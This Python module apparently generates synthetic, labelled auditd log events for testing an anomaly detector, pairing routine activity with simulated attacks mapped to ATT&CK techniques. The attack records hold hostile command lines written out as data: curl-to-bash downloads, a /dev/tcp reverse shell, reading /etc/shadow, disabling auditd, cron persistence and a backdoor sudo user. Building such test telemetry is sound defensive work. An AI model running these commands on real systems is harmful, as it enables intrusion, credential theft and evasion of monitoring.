"""Synthetic, labelled auditd telemetry for model evaluation.

These are *simulated* events shaped like Filebeat's auditd module output. They
exist so the unsupervised model can be measured against something with known
labels -- with the caveat (see README) that "detected simulated attack" is a
weaker signal than "detected real attack", and that the normal set here is far
narrower than a real host's activity.

Each generator yields ``(log_dict, label)`` where label is::

    {"label": "normal"|"malicious", "scenario": str,
     "expect_alert": bool, "expect_technique": str | None}
"""

from __future__ import annotations

import random
from datetime import datetime, timedelta, timezone

_SEQ = [100000]


def _next_seq() -> int:
    _SEQ[0] += 1
    return _SEQ[0]


def _epoch(ts: datetime) -> float:
    return ts.timestamp()


def make_syscall(
    ts: datetime,
    *,
    host: str = "lab-01",
    exe: str,
    comm: str | None = None,
    uid: int = 1000,
    auid: int = 1000,
    euid: int | None = None,
    success: bool = True,
    key: str | None = None,
    tty: str = "pts0",
    syscall: str = "execve",
    argv: list[str] | None = None,
    cwd: str = "/home/dev",
    paths: list[str] | None = None,
    addr: str | None = None,
) -> list[dict]:
    """Return the SYSCALL record plus its EXECVE/PROCTITLE/CWD/PATH children."""

    seq = _next_seq()
    euid = uid if euid is None else euid
    comm = comm or exe.rsplit("/", 1)[-1]
    argv = argv or [comm]
    cmdline = " ".join(argv)
    base_host = {"hostname": host, "name": host.lower(), "ip": ["192.168.10.50"]}
    original = (
        f"type=SYSCALL msg=audit({_epoch(ts):.3f}:{seq}): arch=c000003e syscall=59 "
        f"success={'yes' if success else 'no'} exit=0 ppid=1000 pid={random.randint(2000, 60000)} "
        f"auid={auid} uid={uid} euid={euid} comm=\"{comm}\" exe=\"{exe}\" "
        f"key={key or '(null)'}"
    )
    syscall_doc = {
        "@timestamp": ts.isoformat().replace("+00:00", "Z"),
        "host": dict(base_host),
        "process": {"name": comm, "executable": exe, "pid": 4242, "parent": {"pid": 1000}},
        "user": {"id": str(uid), "effective": {"id": str(euid)}, "audit": {"id": str(auid)}},
        "event": {"module": "auditd", "action": syscall, "category": ["process"], "original": original},
        "service": {"type": "auditd"},
        "auditd": {"log": {
            "sequence": seq,
            "record_type": "SYSCALL",
            "SYSCALL": syscall,
            "exe": exe,
            "comm": comm,
            "uid": str(uid),
            "auid": str(auid),
            "euid": str(euid),
            "success": "yes" if success else "no",
            "key": key,
            "tty": tty,
            "AUID": "dev" if auid == 1000 else ("root" if auid == 0 else str(auid)),
            "UID": "root" if uid == 0 else ("dev" if uid == 1000 else str(uid)),
        }},
    }
    docs = [syscall_doc]

    docs.append(_child(ts, base_host, seq, "EXECVE", {f"a{i}": a for i, a in enumerate(argv)}))
    docs.append(_child(ts, base_host, seq, "PROCTITLE", {"proctitle": cmdline.encode().hex()}))
    docs.append(_child(ts, base_host, seq, "CWD", {"cwd": cwd}))
    for p in paths or []:
        docs.append(_child(ts, base_host, seq, "PATH", {"name": p}))
    if addr:
        # a SOCKADDR child pointing at a remote host:port (port 4444)
        docs.append(_child(ts, base_host, seq, "SOCKADDR", {"addr": addr, "port": "4444"}))
    return docs


def _child(ts: datetime, host: dict, seq: int, record_type: str, fields: dict) -> dict:
    return {
        "@timestamp": ts.isoformat().replace("+00:00", "Z"),
        "host": dict(host),
        "event": {"module": "auditd", "original": f"type={record_type} msg=audit({_epoch(ts):.3f}:{seq}):"},
        "service": {"type": "auditd"},
        "auditd": {"log": {"sequence": seq, "record_type": record_type, **fields}},
    }


def make_user_auth(
    ts: datetime,
    *,
    host: str = "lab-01",
    acct: str = "root",
    success: bool,
    addr: str | None = "203.0.113.7",
    record_type: str = "USER_AUTH",
) -> dict:
    seq = _next_seq()
    original = (
        f"type={record_type} msg=audit({_epoch(ts):.3f}:{seq}): "
        f"acct=\"{acct}\" exe=\"/usr/sbin/sshd\" hostname={addr or '?'} addr={addr or '?'} "
        f"terminal=ssh res={'success' if success else 'failed'}"
    )
    return {
        "@timestamp": ts.isoformat().replace("+00:00", "Z"),
        "host": {"hostname": host, "name": host.lower(), "ip": ["192.168.10.50"]},
        "event": {"module": "auditd", "action": "authenticated", "category": ["authentication"], "original": original},
        "service": {"type": "auditd"},
        "auditd": {"log": {
            "sequence": seq,
            "record_type": record_type,
            "acct": acct,
            "exe": "/usr/sbin/sshd",
            "addr": addr,
            "terminal": "ssh",
            "res": "success" if success else "failed",
            "success": "yes" if success else "no",
        }},
    }


# --- scenarios ------------------------------------------------------------

def _t(base: datetime, minutes: float = 0) -> datetime:
    return base + timedelta(minutes=minutes)


def normal_developer_activity(base: datetime) -> list[tuple[dict, dict]]:
    label = {"label": "normal", "scenario": "developer_activity", "expect_alert": False, "expect_technique": None}
    out = []
    for i, (exe, argv) in enumerate([
        ("/usr/bin/git", ["git", "status"]),
        ("/usr/bin/ls", ["ls", "-la"]),
        ("/usr/bin/cat", ["cat", "README.md"]),
        ("/usr/bin/vim", ["vim", "main.py"]),
        ("/usr/bin/python3", ["python3", "manage.py", "test"]),
        ("/usr/bin/node", ["node", "server.js"]),
    ]):
        for doc in make_syscall(_t(base, i * 3 + 9), exe=exe, argv=argv, uid=1000, auid=1000):  # 09:00-ish
            out.append((doc, label))
    return out


def normal_sudo_apt(base: datetime) -> list[tuple[dict, dict]]:
    label = {"label": "normal", "scenario": "routine_sudo_apt", "expect_alert": False, "expect_technique": None}
    out = []
    for doc in make_syscall(_t(base, 600), exe="/usr/bin/sudo", comm="sudo", uid=0, auid=1000,
                            argv=["sudo", "apt", "install", "-y", "htop"], key="privileged_commands", tty="pts0"):
        out.append((doc, label))
    for doc in make_syscall(_t(base, 600.1), exe="/usr/bin/apt", comm="apt", uid=0, auid=1000,
                            argv=["apt", "install", "-y", "htop"]):
        out.append((doc, label))
    return out


def normal_ssh_login(base: datetime) -> list[tuple[dict, dict]]:
    label = {"label": "normal", "scenario": "normal_ssh_login", "expect_alert": False, "expect_technique": None}
    return [
        (make_user_auth(_t(base, 480), acct="dev", success=True, addr="192.168.10.20"), label),
        (make_user_auth(_t(base, 480.05), acct="dev", success=True, addr="192.168.10.20", record_type="USER_LOGIN"), label),
    ]


def normal_cron(base: datetime) -> list[tuple[dict, dict]]:
    label = {"label": "normal", "scenario": "cron_job", "expect_alert": False, "expect_technique": None}
    out = []
    for doc in make_syscall(_t(base, 180), exe="/usr/sbin/CRON", comm="cron", uid=0, auid=-1,
                            argv=["/usr/sbin/CRON", "-f"], tty="(none)"):
        out.append((doc, label))
    for doc in make_syscall(_t(base, 180.1), exe="/usr/bin/find", comm="find", uid=0, auid=-1,
                            argv=["find", "/tmp", "-mtime", "+7", "-delete"]):
        out.append((doc, label))
    return out


def normal_service_restart(base: datetime) -> list[tuple[dict, dict]]:
    label = {"label": "normal", "scenario": "service_mgmt", "expect_alert": False, "expect_technique": None}
    out = []
    for doc in make_syscall(_t(base, 300), exe="/usr/bin/systemctl", comm="systemctl", uid=0, auid=1000,
                            argv=["systemctl", "restart", "nginx"], key="privileged_commands"):
        out.append((doc, label))
    return out


def attack_ssh_bruteforce(base: datetime) -> list[tuple[dict, dict]]:
    label = {"label": "malicious", "scenario": "ssh_bruteforce", "expect_alert": True, "expect_technique": "T1110"}
    out = []
    for i in range(12):
        out.append((make_user_auth(_t(base, 1440 + i * 0.2), acct="root", success=False, addr="203.0.113.66"), label))
    # a success at the end (credential found)
    out.append((make_user_auth(_t(base, 1443), acct="root", success=True, addr="203.0.113.66"), label))
    return out


def attack_sudo_to_root_shell(base: datetime) -> list[tuple[dict, dict]]:
    label = {"label": "malicious", "scenario": "priv_esc_root_shell", "expect_alert": True, "expect_technique": "T1548.003"}
    out = []
    for doc in make_syscall(_t(base, 1500), exe="/usr/bin/sudo", comm="sudo", uid=0, auid=1000,
                            argv=["sudo", "su", "-"], key="privileged_commands", tty="pts3"):
        out.append((doc, label))
    for doc in make_syscall(_t(base, 1500.1), exe="/usr/bin/bash", comm="bash", uid=0, auid=1000,
                            argv=["bash", "-i"], tty="pts3"):
        out.append((doc, label))
    return out


def attack_nmap_scan(base: datetime) -> list[tuple[dict, dict]]:
    label = {"label": "malicious", "scenario": "network_scan", "expect_alert": True, "expect_technique": "T1046"}
    out = []
    for doc in make_syscall(_t(base, 1600), exe="/usr/bin/nmap", comm="nmap", uid=1000, auid=1000,
                            argv=["nmap", "-sS", "-p-", "192.168.10.0/24"], addr="192.168.10.5"):
        out.append((doc, label))
    return out


def attack_curl_pipe_bash(base: datetime) -> list[tuple[dict, dict]]:
    label = {"label": "malicious", "scenario": "ingress_tool_transfer", "expect_alert": True, "expect_technique": "T1105"}
    out = []
    for doc in make_syscall(_t(base, 1700), exe="/usr/bin/curl", comm="curl", uid=1000, auid=1000,
                            argv=["curl", "-s", "http://203.0.113.9/x.sh", "|", "bash"], addr="203.0.113.9"):
        out.append((doc, label))
    return out


def attack_reverse_shell(base: datetime) -> list[tuple[dict, dict]]:
    label = {"label": "malicious", "scenario": "reverse_shell", "expect_alert": True, "expect_technique": "T1059.004"}
    out = []
    for doc in make_syscall(_t(base, 1800), exe="/usr/bin/bash", comm="bash", uid=1000, auid=1000,
                            argv=["bash", "-c", "bash -i >& /dev/tcp/203.0.113.4/4444 0>&1"], addr="203.0.113.4"):
        out.append((doc, label))
    return out


def attack_shadow_read(base: datetime) -> list[tuple[dict, dict]]:
    label = {"label": "malicious", "scenario": "credential_access", "expect_alert": True, "expect_technique": "T1003.008"}
    out = []
    for doc in make_syscall(_t(base, 1900), exe="/usr/bin/cat", comm="cat", uid=0, auid=1000,
                            argv=["cat", "/etc/shadow"], syscall="openat", paths=["/etc/shadow"],
                            key="shadow", tty="pts5"):
        out.append((doc, label))
    return out


def attack_disable_auditd(base: datetime) -> list[tuple[dict, dict]]:
    label = {"label": "malicious", "scenario": "defense_evasion", "expect_alert": True, "expect_technique": "T1562.001"}
    out = []
    for doc in make_syscall(_t(base, 2000), exe="/usr/sbin/auditctl", comm="auditctl", uid=0, auid=1000,
                            argv=["auditctl", "-e", "0"], key="privileged_commands", tty="pts6"):
        out.append((doc, label))
    return out


def attack_persistence_cron(base: datetime) -> list[tuple[dict, dict]]:
    label = {"label": "malicious", "scenario": "persistence_cron", "expect_alert": True, "expect_technique": "T1053.003"}
    out = []
    for doc in make_syscall(_t(base, 2100), exe="/usr/bin/bash", comm="bash", uid=0, auid=1000,
                            argv=["bash", "-c", "echo '* * * * * root curl 203.0.113.4/b|bash' > /etc/cron.d/x"],
                            syscall="openat", paths=["/etc/cron.d/x"], tty="pts7"):
        out.append((doc, label))
    return out


def attack_add_user(base: datetime) -> list[tuple[dict, dict]]:
    label = {"label": "malicious", "scenario": "persistence_account", "expect_alert": True, "expect_technique": "T1136.001"}
    out = []
    for doc in make_syscall(_t(base, 2200), exe="/usr/sbin/useradd", comm="useradd", uid=0, auid=1000,
                            argv=["useradd", "-m", "-s", "/bin/bash", "-G", "sudo", "svc-backup"],
                            key="identity", tty="pts8"):
        out.append((doc, label))
    return out


NORMAL_SCENARIOS = [
    normal_developer_activity,
    normal_sudo_apt,
    normal_ssh_login,
    normal_cron,
    normal_service_restart,
]

ATTACK_SCENARIOS = [
    attack_ssh_bruteforce,
    attack_sudo_to_root_shell,
    attack_nmap_scan,
    attack_curl_pipe_bash,
    attack_reverse_shell,
    attack_shadow_read,
    attack_disable_auditd,
    attack_persistence_cron,
    attack_add_user,
]


def generate(base: datetime | None = None, repeats: int = 1) -> list[tuple[dict, dict]]:
    """All scenarios, optionally repeated with jittered timing."""

    base = base or datetime(2026, 6, 1, tzinfo=timezone.utc)
    _SEQ[0] = 100000
    events: list[tuple[dict, dict]] = []
    for r in range(repeats):
        day_base = base + timedelta(days=r)
        for gen in NORMAL_SCENARIOS + ATTACK_SCENARIOS:
            events.extend(gen(day_base))
    return events
